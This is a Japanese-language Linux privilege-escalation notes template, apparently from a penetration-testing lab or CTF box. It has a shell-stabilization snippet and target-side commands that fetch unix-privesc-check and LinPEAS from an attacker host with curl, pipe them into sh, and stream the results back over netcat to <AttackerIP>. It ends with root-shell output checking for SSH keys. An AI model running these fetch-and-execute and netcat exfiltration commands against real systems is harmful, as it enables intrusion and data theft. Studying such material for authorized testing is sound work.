# シェルの安定化

※penelopeでシェル獲得できた場合は不要
```zsh
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
# Ctrl + Z
stty raw -echo; fg
```

---

# Auto 

## unix-privesc-check

### 転送・実行

```zsh
# Attacker
cp /usr/bin/unix-privesc-check .
python -m http.server 8888
nc -lvnp 9002 | tee unix-privesc-check.out
```
```zsh
# Target
curl <AttackerIP>:8888/unix-privesc-check | sh -s standard | nc -q 0 <AttackerIP> 9002
```

### 実行結果抽出


---

## LinPEAS

### 転送・実行

```zsh
# Attacker
cp /usr/share/peass/linpeas/linpeas.sh .
python -m http.server 8888
nc -lvnp 9002 | tee linpeas.out
```
```zsh
# Target
curl <AttackerIP>:8888/linpeas.sh | sh | nc -q 0 <AttackerIP> 9002
```

### 実行結果抽出

```sh

```

---
---

# Manual

## ユーザー


---

## システム情報


---

## 実行中のプロセス


---

## ネットワーク


---

## Cron


---

## インストール済みアプリケーション


---

## アクセス制限が不十分なファイル/ディレクトリ


---

## マウントされていないドライブ


---

## 高権限をもつバイナリの列挙



---

## システムデーモン



---

## 共有フォルダ、SNMP情報


---

## 興味深い情報

- ssh秘密鍵はなさそう
```sh
root@milan:/etc/ssh# find / -name .ssh -type d 2>/dev/null
/root/.ssh
/home/milan/.ssh
root@milan:/etc/ssh# ls -la /root/.ssh
total 8
drwx------  2 root root 4096 Nov 23  2022 .
drwx------ 16 root root 4096 Feb 15 10:01 ..
root@milan:/etc/ssh# ls -la /home/milan/.ssh
total 8
drwx------  2 milan milan04 4096 Nov 14  2022 .
drwxr-xr-x 15 milan milan04 4096 Jan 24  2023 ..
```


---

## デバイスドライバ・カーネルモジュール



